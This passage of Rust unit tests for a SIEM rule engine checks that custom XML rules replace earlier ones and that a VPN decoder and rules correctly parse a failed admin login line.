        let clone = eng.clone();
        clone.set_custom_rules_xml(r#"<rule id="3000" level="6"><match>alpha</match></rule>"#);
        assert_eq!(fired_id(&eng, "alpha"), Some(3000));
        assert!(eng.list_rules().iter().any(|r| r.id == 3000));
        clone.set_custom_rules_xml(r#"<rule id="3001" level="6"><match>beta</match></rule>"#);
        assert_eq!(fired_id(&eng, "alpha"), None);
        assert_eq!(fired_id(&eng, "beta"), Some(3001));
        let ids: Vec<u32> = eng.list_rules().iter().map(|r| r.id).collect();
        assert!(ids.contains(&3001) && !ids.contains(&3000) && ids.contains(&5712) && ids.contains(&60102));
    }

    #[test]
    fn ruleset_folder_decoders_and_rules() {
        let dir = std::env::temp_dir().join(format!("siem-engine-test-{}", Uuid::new_v4()));
        std::fs::create_dir_all(dir.join("decoders")).unwrap();
        std::fs::create_dir_all(dir.join("rules")).unwrap();
        std::fs::write(
            dir.join("decoders/a.xml"),
            r#"<decoder name="vpn"><program_name>^vpnd$</program_name></decoder>
               <decoder name="vpn-login"><parent>vpn</parent><prematch>^login failed</prematch>
                 <regex>user (\S+) from (\S+)</regex><order>dstuser, srcip</order></decoder>"#,
        )
        .unwrap();
        std::fs::write(dir.join("rules/b.xml"), r#"<group name="vpn,"><rule id="4001" level="6"><if_sid>4000</if_sid><field name="dstuser">^admin$</field></rule></group>"#).unwrap();
        std::fs::write(dir.join("rules/a.xml"), r#"<group name="vpn,"><rule id="4000" level="0"><decoded_as>vpn</decoded_as></rule></group>"#).unwrap();
        let eng = AnalysisEngine::with_ruleset(Some(&dir));
        std::fs::remove_dir_all(&dir).ok();

        let a = fire(&eng, "Nov  3 10:00:00 gw vpnd[42]: login failed user admin from 8.8.4.4").unwrap();
        assert_eq!((a.rule.id, a.decoder.unwrap().name.as_str()), (4001, "vpn"));
        assert_eq!(a.decoded.src_ip.as_deref(), Some("8.8.4.4"));
        assert_eq!(a.decoded.user.as_deref(), Some("admin"));
        assert_eq!(a.decoded.process_id, Some(42));
        assert_eq!(a.data["dstuser"], serde_json::json!("admin"));
        assert_eq!(fired_id(&eng, "Nov  3 10:00:00 gw vpnd: login failed user bob from 8.8.4.4"), None);
    }
}
